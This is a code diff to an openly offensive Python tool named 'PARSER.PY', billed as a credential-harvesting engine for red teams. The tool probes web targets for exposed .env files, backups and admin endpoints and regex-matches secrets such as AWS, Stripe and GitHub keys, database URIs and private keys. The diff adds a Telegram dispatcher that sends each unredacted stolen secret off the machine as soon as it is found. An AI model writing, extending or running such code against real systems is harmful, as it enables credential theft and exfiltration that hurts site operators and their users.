@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine (Elite Red Team Edition)
+PARSER.PY — Live Endpoint Discovery & Credential Harvesting Engine (Elite Red Team Edition with Telegram Telemetry)
 Features:
 - High-concurrency asynchronous and multi-threaded endpoint sweep
 - Expanded high-value path discovery (Actuators, GraphQL, Swagger, Backups, .env variants)
 - Advanced credential & secret regex harvesting (Stripe, GitHub, AWS, DB URIs, JWTs, Private Keys)
 - Unredacted red-team terminal streaming & automated disk loot exfiltration (loot_output/)
 - TLS verification bypass for staging/test environments
+- Real-time asynchronous Telegram notification dispatch for unredacted parser loot & secrets
 """
 import asyncio
 import re
@@ -18,14 +19,15 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.request import Request, urlopen
 from urllib.error import HTTPError, URLError
 
-# Import centralized framework loot exfiltration and telemetry if available
+# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
 try:
     from modules.loot_logger import save_session_loot
     from modules.telemetry import stream_proof
+    from modules.telegram_notifier import send_telegram_alert
 except ImportError:
-    # Fallback stubs for standalone execution
     def save_session_loot(*args, **kwargs): pass
     def stream_proof(*args, **kwargs): pass
+    async def send_telegram_alert(*args, **kwargs): pass
 
 # ============================================================
 # CONFIGURATION
@@ -33,7 +35,7 @@ except ImportError:
 MAX_WORKERS = 16
 REQUEST_TIMEOUT = 8
 MAX_RESPONSE_SIZE = 1024 * 1024
-USER_AGENT = "NEXUS-OffensiveParser/3.0"
+USER_AGENT = "NEXUS-OffensiveParser/8.0"
 
 COMMON_PATHS = [
     "/",
@@ -110,7 +112,7 @@ SENSITIVE_PATTERNS = {
 }
 
 # ============================================================
-# TERMINAL OUTPUT
+# TERMINAL OUTPUT & TELEGRAM DISPATCHER
 # ============================================================
 def print_status(message):
     print(f"\033[96m[INFO]\033[0m {message}", flush=True)
@@ -129,6 +131,17 @@ def print_section(title):
     print("=" * 65)
     print(f" \033[1m{title}\033[0m")
     print("=" * 65)
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous parser functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 # ============================================================
 # TARGET NORMALIZATION
@@ -181,6 +194,17 @@ def analyze_response(base_url, path, status, headers, body):
                     "exposure_confirmed": True,
                 })
                 
+                loot_payload = {
+                    "url": urljoin(base_url.rstrip("/") + "/", path.lstrip("/")),
+                    "path": path,
+                    "secret_type": label,
+                    "matched_value": secret_value,
+                    "status": status
+                }
+                
+                # BROADCAST UNREDACTED SECRET LOOT STRAIGHT TO TELEGRAM
+                broadcast_tg_alert_sync(f"Parser Secret Harvested [{label}]", loot_payload)
+
                 # PERSIST HARVESTED SECRET TO DISK & STREAM TELEMETRY
                 stream_proof("PARSER_SECRET_HARVESTED", path, {"secret_type": label}, text[:300], {"matched_value": secret_value})
                 save_session_loot(
@@ -190,7 +214,7 @@ def analyze_response(base_url, path, status, headers, body):
                     status=status,
                     headers=dict(headers),
                     body=text,
-                    extra_loot={"secret_type": label, "matched_value": secret_value}
+                    extra_loot=loot_payload
                 )
     return findings
 
@@ -270,11 +294,11 @@ def display_result(result):
         elif status in (401, 403):
             print_warning(f"{status} | {path} | Access restricted")
         elif status == 404:
-            pass # Suppress 404 noise in aggressive red team mode
+            pass
         else:
             print(f"[HTTP {status}] {path}", flush=True)
     else:
-        pass # Suppress connection timeouts/errors for clean output
+        pass
         
     for finding in result["findings"]:
         import sys
@@ -374,5 +398,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print_warning("Parser interrupted by user.")
     except Exception as exc:
-        print_error(f"Parser failed: {exc}")
         print_error(f"Parser failed: {exc}")
